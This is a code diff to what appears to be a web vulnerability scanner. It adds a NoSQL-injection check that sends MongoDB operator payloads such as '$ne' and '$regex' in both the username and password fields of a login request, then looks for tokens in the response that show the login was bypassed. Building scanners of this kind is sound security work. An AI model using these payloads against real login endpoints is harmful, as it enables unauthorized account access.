@@ -2256,6 +2256,79 @@ async def nosql_injection_test_json_body(
         body = raw[: match.start()]
         return body, int(match.group(1))
 
+    def _param_tokens(name: str) -> set[str]:
+        return {part for part in re.split(r"[^a-z0-9]+", name.lower()) if part}
+
+    def _is_identity_param(name: str) -> bool:
+        lowered = name.lower()
+        tokens = _param_tokens(lowered)
+        return (
+            "email" in lowered
+            or "username" in lowered
+            or "user_name" in lowered
+            or "login" in tokens
+            or "userid" in lowered
+            or "user" in tokens
+        )
+
+    def _is_secret_param(name: str) -> bool:
+        lowered = name.lower()
+        return "password" in lowered or "passwd" in lowered or lowered in {"pass", "pwd"}
+
+    def _is_auth_failure(status: int | None, body: str) -> bool:
+        lowered = (body or "").lower()
+        failure_markers = (
+            "invalid credentials", "invalid email", "invalid password",
+            "login failed", "authentication failed", "unauthorized",
+            "forbidden", "wrong password", "user not found",
+        )
+        return (status in {400, 401, 403, 404, 422}) or any(marker in lowered for marker in failure_markers)
+
+    def _flatten_json_keys(value: Any, prefix: str = "") -> set[str]:
+        keys: set[str] = set()
+        if isinstance(value, dict):
+            for key, child in value.items():
+                key_text = str(key)
+                full = f"{prefix}.{key_text}" if prefix else key_text
+                keys.add(full.lower())
+                keys.update(_flatten_json_keys(child, full))
+        elif isinstance(value, list):
+            for child in value[:5]:
+                keys.update(_flatten_json_keys(child, prefix))
+        return keys
+
+    def _auth_success_signals(body: str) -> list[str]:
+        if not body:
+            return []
+        lowered = body.lower()
+        signals: set[str] = set()
+        try:
+            parsed = json.loads(body)
+        except Exception:
+            parsed = None
+        if parsed is not None:
+            keys = _flatten_json_keys(parsed)
+            auth_key_fragments = (
+                "token", "access_token", "refreshtoken", "refresh_token",
+                "jwt", "session", "authentication", "authorization",
+            )
+            identity_key_fragments = (
+                "user", "username", "email", "role", "roles", "account", "profile",
+            )
+            if any(any(fragment in key for fragment in auth_key_fragments) for key in keys):
+                signals.add("auth_token_or_session")
+            if any(any(fragment in key for fragment in identity_key_fragments) for key in keys):
+                signals.add("user_identity_data")
+        text_markers = (
+            '"token"', '"access_token"', '"accessToken"', '"refresh_token"',
+            '"jwt"', '"authentication"', '"authorization"', '"session"',
+        )
+        if any(marker.lower() in lowered for marker in text_markers):
+            signals.add("auth_token_or_session")
+        if re.search(r'"(?:email|username|role|user(?:_id|id)?)"\s*:', body, re.I):
+            signals.add("user_identity_data")
+        return sorted(signals)
+
     # NoSQLi payloads for JSON body injection
     nosql_payloads = [
         {"$ne": ""},                   # Not equal to empty - bypasses auth
@@ -2287,6 +2360,71 @@ async def nosql_injection_test_json_body(
     if debug_nosql:
         print(f"[DEBUG NoSQL Test] url={url} method={method} params={params}", file=sys.stderr)
         print(f"[DEBUG NoSQL Test] base_body={base_body}", file=sys.stderr)
+
+    identity_params = [p for p in params if _is_identity_param(p)]
+    secret_params = [p for p in params if _is_secret_param(p)]
+    if identity_params and secret_params:
+        identity_param = identity_params[0]
+        secret_param = secret_params[0]
+        baseline_payload = copy.deepcopy(base_body)
+        _set_nested_value(baseline_payload, identity_param, _fallback_value_for_param(identity_param), overwrite=True)
+        _set_nested_value(baseline_payload, secret_param, "shakerscan_invalid_password_12345", overwrite=True)
+        baseline_body = json.dumps(baseline_payload)
+        baseline_cmd = [
+            "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
+            "-H", "Content-Type: application/json",
+            "-d", baseline_body,
+            "-w", "__SHAKERSCAN_NOSQL__%{http_code}__SHAKERSCAN_NOSQL__",
+        ] + auth_args + [url]
+        baseline_raw, _, baseline_rc = await run(baseline_cmd, timeout=15)
+        baseline_out, baseline_code = _parse_meta(baseline_raw or "")
+        if baseline_rc == 0 and baseline_code in (405, 415, 501):
+            results["skipped"] = True
+            results["reason"] = "method_or_content_type_not_supported"
+            results["baseline_status"] = baseline_code
+            return results
+
+        if baseline_rc == 0 and _is_auth_failure(baseline_code, baseline_out):
+            combo_payloads = [
+                {"$ne": None},
+                {"$ne": ""},
+                {"$gt": ""},
+                {"$regex": ".*"},
+            ]
+            for payload in combo_payloads:
+                test_payload = copy.deepcopy(base_body)
+                _set_nested_value(test_payload, identity_param, payload, overwrite=True)
+                _set_nested_value(test_payload, secret_param, payload, overwrite=True)
+                test_body = json.dumps(test_payload)
+                test_cmd = [
+                    "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
+                    "-H", "Content-Type: application/json",
+                    "-d", test_body,
+                    "-w", "__SHAKERSCAN_NOSQL__%{http_code}__SHAKERSCAN_NOSQL__",
+                ] + auth_args + [url]
+                test_raw, _, test_rc = await run(test_cmd, timeout=15)
+                if test_rc != 0:
+                    continue
+                test_out, test_code = _parse_meta(test_raw or "")
+                if test_code in (405, 415, 501):
+                    continue
+                if test_out and ("<!DOCTYPE" in test_out[:200] or "<html" in test_out[:200].lower()):
+                    continue
+                success_signals = _auth_success_signals(test_out)
+                if test_code is not None and test_code < 400 and len(success_signals) >= 2:
+                    results["vulnerable"] = True
+                    results["findings"].append({
+                        "parameter": f"{identity_param},{secret_param}",
+                        "payload": json.dumps({identity_param: payload, secret_param: payload}),
+                        "evidence_type": "credential_operator_bypass",
+                        "baseline_status": baseline_code,
+                        "payload_status": test_code,
+                        "success_signals": success_signals,
+                        "baseline_length": len(baseline_out or ""),
+                        "payload_length": len(test_out or ""),
+                        "response_snippet": test_out[:500] if test_out else "",
+                    })
+                    return results
 
     for param in params[:5]:  # Limit to first 5 params
         results["params_tested"] += 1
